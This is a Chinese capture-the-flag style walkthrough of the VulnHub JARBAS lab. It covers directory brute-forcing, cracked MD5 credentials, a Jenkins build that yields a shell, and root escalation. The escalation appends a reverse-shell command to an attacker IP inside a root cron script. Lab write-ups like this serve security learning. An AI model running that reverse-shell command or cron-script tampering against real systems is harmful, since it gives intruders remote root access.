---
title: vulnhub-JARBAS
date: 2025-08-1
categories: [靶场]
tags:
  - dirb
  - Vulnhub靶场
  - gobuster
  - hash-identifier
  - jenkins CMS
  - 定时任务提权root
---



## 端口扫描
![](img/1.png)



### 80 端口


![](img/2.png)



8080 端口

![](img/3.png)





#### dirb 目录爆破
![](img/4.png)



##### dirb 进阶
```bash
格式：dirb <url_base> [<wordlist_file(s)>] [options]
-a 设置user-agent
-p <proxy[:port]>设置代理
-c 设置cookie
-z 添加毫秒延迟，避免洪水攻击
-o 输出结果
-X 在每个字典的后面添加一个后缀
-H 添加请求头
-i 不区分大小写搜索
```

![](img/5.png)



#### gobuster
![](img/6.png)



### 访问/access.html
![](img/7.png)

![](img/8.png)



| user | md5 | decrypt |
| --- | --- | --- |
| tiago | 5978a63b4654c73c60fa24f836386d87 | italia99 |
| trindade | f463f63616cb3f1e81ce46b39f882fd5 | marianna |
| eder | 9b38e2b1e8b12f426b0d208a7ab6cb98 | vipsu |






### 进入系统
![](img/9.png)



## 漏洞利用
框架利用了 jenkins



新建 item

![](img/10.png)

![](img/11.png)



#### build
![](img/12.png)



![](img/13.png)



kali 开启监听

![](img/14.png)

![](img/15.png)



得到 shell



## 提权


![](img/16.png)



发现了一个每五分钟定期执行的sh脚本CleaningScript.sh

![](img/17.png)



将以下代码写入该脚本中，再脚本执行的时候执行反弹 shell 命令

```bash
echo "/bin/bash –i >& /dev/tcp/192.168.180.248/4443 0>&1" >> /etc/script/CleaningScript.sh
```



kali 建立监听，等待反弹 root shell 即可

![](img/18.png)







































































